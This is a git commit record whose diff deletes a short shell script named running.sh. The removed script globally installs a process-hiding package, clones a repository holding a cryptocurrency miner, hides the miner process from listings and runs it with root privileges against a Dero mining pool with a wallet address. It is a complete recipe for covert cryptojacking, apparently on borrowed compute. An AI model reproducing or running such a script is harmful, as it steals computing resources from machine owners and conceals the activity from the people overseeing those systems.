93209e81487cbc58ec1b647c0797bdc734e24470
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-30 06:58:06 +0700

    Delete running.sh

--- running.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-npm i -g node-process-hider
-git clone https://github.com/realxdagg/job.git
-cd job
-chmod 500 astrominer
-ph add astrominer
-sudo ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero-node-us-west.mysrv.cloud:10300 -p rpc -t 8
